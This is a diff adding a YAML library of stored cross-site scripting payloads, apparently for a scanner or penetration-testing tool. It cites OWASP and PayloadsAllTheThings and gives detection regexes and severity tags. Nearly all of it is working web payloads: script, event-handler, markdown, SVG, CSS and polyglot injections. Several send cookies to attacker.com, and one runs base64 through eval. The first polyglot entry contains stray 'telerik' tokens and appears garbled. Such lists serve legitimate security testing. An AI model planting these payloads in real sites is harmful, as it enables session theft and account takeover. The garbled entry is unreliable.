@@ -1,0 +1,346 @@
+metadata:
+  type: xss/stored
+  version: "1.0"
+  description: "Stored/persistent XSS payloads"
+  sources: ["OWASP", "PortSwigger", "PayloadsAllTheThings"]
+
+detection_patterns:
+  - "<script[^>]*>.*?alert"
+  - "on\\w+\\s*=.*?alert"
+  - "document\\.cookie"
+
+payloads:
+  persistent:
+    - value: "<script>alert(1)</script>"
+      description: "Basic stored script"
+      severity: critical
+      tags: [persistent, script]
+
+    - value: "<script>alert(document.cookie)</script>"
+      description: "Stored cookie theft"
+      severity: critical
+      tags: [persistent, script, cookie]
+
+    - value: "<script>fetch('http://attacker.com/?c='+document.cookie)</script>"
+      description: "Stored fetch exfiltration"
+      severity: critical
+      tags: [persistent, script, exfiltration]
+
+    - value: "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>"
+      description: "Stored image exfiltration"
+      severity: critical
+      tags: [persistent, script, exfiltration]
+
+    - value: "<img src=x onerror=alert(1)>"
+      description: "Stored img onerror"
+      severity: critical
+      tags: [persistent, img]
+
+    - value: "<img src=x onerror=alert(document.cookie)>"
+      description: "Stored img cookie theft"
+      severity: critical
+      tags: [persistent, img, cookie]
+
+    - value: "<svg onload=alert(1)>"
+      description: "Stored svg onload"
+      severity: critical
+      tags: [persistent, svg]
+
+    - value: "<svg onload=fetch('http://attacker.com/?c='+document.cookie)>"
+      description: "Stored svg exfiltration"
+      severity: critical
+      tags: [persistent, svg, exfiltration]
+
+    - value: "<iframe src=javascript:alert(1)>"
+      description: "Stored iframe javascript"
+      severity: critical
+      tags: [persistent, iframe]
+
+    - value: "<iframe src=\"javascript:alert(document.cookie)\">"
+      description: "Stored iframe cookie"
+      severity: critical
+      tags: [persistent, iframe, cookie]
+
+    - value: "<iframe onload=alert(1)>"
+      description: "Stored iframe onload"
+      severity: critical
+      tags: [persistent, iframe]
+
+    - value: "<details open ontoggle=alert(1)>"
+      description: "Stored details ontoggle"
+      severity: critical
+      tags: [persistent, details]
+
+    - value: "<body onload=alert(1)>"
+      description: "Stored body onload"
+      severity: critical
+      tags: [persistent, body]
+
+    - value: "<input onfocus=alert(1) autofocus>"
+      description: "Stored input autofocus"
+      severity: critical
+      tags: [persistent, input]
+
+    - value: "<video onerror=alert(1)><source>"
+      description: "Stored video onerror"
+      severity: critical
+      tags: [persistent, video]
+
+    - value: "<audio onerror=alert(1)><source>"
+      description: "Stored audio onerror"
+      severity: critical
+      tags: [persistent, audio]
+
+    - value: "<marquee onstart=alert(1)>"
+      description: "Stored marquee"
+      severity: high
+      tags: [persistent, marquee]
+
+    - value: "<object data=javascript:alert(1)>"
+      description: "Stored object data"
+      severity: critical
+      tags: [persistent, object]
+
+    - value: "<embed src=javascript:alert(1)>"
+      description: "Stored embed"
+      severity: critical
+      tags: [persistent, embed]
+
+    - value: "<a href=javascript:alert(1)>click me</a>"
+      description: "Stored anchor javascript"
+      severity: critical
+      tags: [persistent, anchor]
+
+    - value: "<a href=\"javascript:alert(document.cookie)\">click me</a>"
+      description: "Stored anchor cookie"
+      severity: critical
+      tags: [persistent, anchor, cookie]
+
+    - value: "<div onmouseover=alert(1)>hover me</div>"
+      description: "Stored div hover"
+      severity: high
+      tags: [persistent, div]
+
+    - value: "<button onclick=alert(1)>click</button>"
+      description: "Stored button click"
+      severity: high
+      tags: [persistent, button]
+
+    - value: "<form action=javascript:alert(1)><input type=submit></form>"
+      description: "Stored form action"
+      severity: critical
+      tags: [persistent, form]
+
+    - value: "<script>document.location='http://attacker.com/?c='+document.cookie</script>"
+      description: "Stored redirect exfil"
+      severity: critical
+      tags: [persistent, redirect, exfiltration]
+
+    - value: "<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>"
+      description: "Stored base64 eval"
+      severity: critical
+      tags: [persistent, base64]
+
+  markdown:
+    - value: "[xss](javascript:alert(1))"
+      description: "Markdown javascript link"
+      severity: high
+      tags: [markdown, link]
+
+    - value: "[xss](javascript:alert(document.cookie))"
+      description: "Markdown cookie theft"
+      severity: high
+      tags: [markdown, link, cookie]
+
+    - value: "[xss](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"
+      description: "Markdown data URI"
+      severity: high
+      tags: [markdown, data_uri]
+
+    - value: "![xss](javascript:alert(1))"
+      description: "Markdown image javascript"
+      severity: high
+      tags: [markdown, image]
+
+    - value: "![xss](http://attacker.com/xss.png)"
+      description: "Markdown external image"
+      severity: medium
+      tags: [markdown, image, external]
+
+    - value: "[xss]: javascript:alert(1)"
+      description: "Markdown reference link"
+      severity: high
+      tags: [markdown, reference]
+
+    - value: "<a href=javascript:alert(1)>xss</a>"
+      description: "HTML in markdown"
+      severity: high
+      tags: [markdown, html]
+
+    - value: "<img src=x onerror=alert(1)>"
+      description: "HTML img in markdown"
+      severity: high
+      tags: [markdown, html]
+
+    - value: "<details open ontoggle=alert(1)>"
+      description: "HTML details in markdown"
+      severity: high
+      tags: [markdown, html]
+
+    - value: "[](javascript:alert(1))"
+      description: "Empty text javascript link"
+      severity: high
+      tags: [markdown, link]
+
+    - value: "[click](javascript&#58;alert(1))"
+      description: "Markdown entity bypass"
+      severity: high
+      tags: [markdown, entity]
+
+    - value: "[click](java script:alert(1))"
+      description: "Markdown space bypass"
+      severity: high
+      tags: [markdown, space]
+
+  svg_xml:
+    - value: "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\">"
+      description: "SVG with namespace onload"
+      severity: critical
+      tags: [svg, xml]
+
+    - value: "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>"
+      description: "SVG with script element"
+      severity: critical
+      tags: [svg, script]
+
+    - value: "<svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"alert(1)\"></g></svg>"
+      description: "SVG g element onload"
+      severity: critical
+      tags: [svg]
+
+    - value: "<svg xmlns=\"http://www.w3.org/2000/svg\"><circle onmouseover=\"alert(1)\" r=50/></svg>"
+      description: "SVG circle onmouseover"
+      severity: high
+      tags: [svg]
+
+    - value: "<svg xmlns=\"http://www.w3.org/2000/svg\"><animate onbegin=\"alert(1)\" attributeName=x dur=1s>"
+      description: "SVG animate onbegin"
+      severity: high
+      tags: [svg, animate]
+
+    - value: "<svg xmlns=\"http://www.w3.org/2000/svg\"><set onbegin=\"alert(1)\" attributeName=x>"
+      description: "SVG set onbegin"
+      severity: high
+      tags: [svg, set]
+
+    - value: "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><a xlink:href=\"javascript:alert(1)\"><text>click</text></a></svg>"
+      description: "SVG xlink javascript"
+      severity: critical
+      tags: [svg, xlink]
+
+    - value: "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\">"
+      description: "XML declaration SVG"
+      severity: critical
+      tags: [svg, xml]
+
+    - value: "<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>"
+      description: "SVG foreignObject body"
+      severity: critical
+      tags: [svg, foreignObject]
+
+    - value: "<svg><use href=\"data:image/svg+xml,<svg id=x onload=alert(1)></svg>\"></svg>"
+      description: "SVG use href data"
+      severity: critical
+      tags: [svg, use]
+
+  css_injection:
+    - value: "<style>body{background:url('javascript:alert(1)')}</style>"
+      description: "CSS background javascript"
+      severity: high
+      tags: [css, background]
+
+    - value: "<div style=\"background-image:url(javascript:alert(1))\">"
+      description: "CSS inline background"
+      severity: high
+      tags: [css, inline]
+
+    - value: "<style>@import 'http://attacker.com/xss.css'</style>"
+      description: "CSS @import external"
+      severity: high
+      tags: [css, import]
+
+    - value: "<link rel=stylesheet href=http://attacker.com/xss.css>"
+      description: "CSS link external"
+      severity: high
+      tags: [css, link]
+
+    - value: "<style>body{-moz-binding:url('http://attacker.com/xss.xml#xss')}</style>"
+      description: "CSS -moz-binding"
+      severity: high
+      tags: [css, binding]
+
+    - value: "<div style=\"width:expression(alert(1))\">"
+      description: "CSS expression IE"
+      severity: high
+      tags: [css, expression]
+
+    - value: "<style>input[value*=\"a\"]{background:url('http://attacker.com/?a')}</style>"
+      description: "CSS attribute selector exfil"
+      severity: high
+      tags: [css, exfiltration]
+
+    - value: "<style>@keyframes x{}*{animation:x 0s}</style><div style=animation-name:x onanimationstart=alert(1)>"
+      description: "CSS animation XSS"
+      severity: high
+      tags: [css, animation]
+
+  polyglot:
+    - value: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik11telerik/telerik/oNcliCk=alert()//>/telerik<telerik/telerik/oNcliCk=alert()//>>telerik<</telerik/oNcliCk=alert()/telerik*/alert()/*</telerik></telerik>*/alert()//"
+      description: "Polyglot XSS payload"
+      severity: high
+      tags: [polyglot]
+
+    - value: "';alert(1)//';alert(1)//\";alert(1)//\";alert(1)//--></SCRIPT>\">'><SCRIPT>alert(1)</SCRIPT>"
+      description: "Multi-context polyglot"
+      severity: high
+      tags: [polyglot]
+
+    - value: "\"><img src=x onerror=alert(1)//"
+      description: "Quote breakout polyglot"
+      severity: high
+      tags: [polyglot]
+
+    - value: "'-alert(1)-'"
+      description: "Expression polyglot"
+      severity: high
+      tags: [polyglot]
+
+    - value: "\";alert(1);//"
+      description: "Semicolon polyglot"
+      severity: high
+      tags: [polyglot]
+
+    - value: "</script><script>alert(1)</script>"
+      description: "Script close polyglot"
+      severity: high
+      tags: [polyglot]
+
+    - value: "'-alert(1)-''"
+      description: "Single quote expression"
+      severity: high
+      tags: [polyglot]
+
+    - value: "\";alert(1);\""
+      description: "Double quote semicolon"
+      severity: high
+      tags: [polyglot]
+
+    - value: "'-alert(1)//"
+      description: "Comment close expression"
+      severity: high
+      tags: [polyglot]
+
+    - value: "\" onclick=alert(1) x=\""
+      description: "Attribute injection polyglot"
+      severity: high
+      tags: [polyglot]
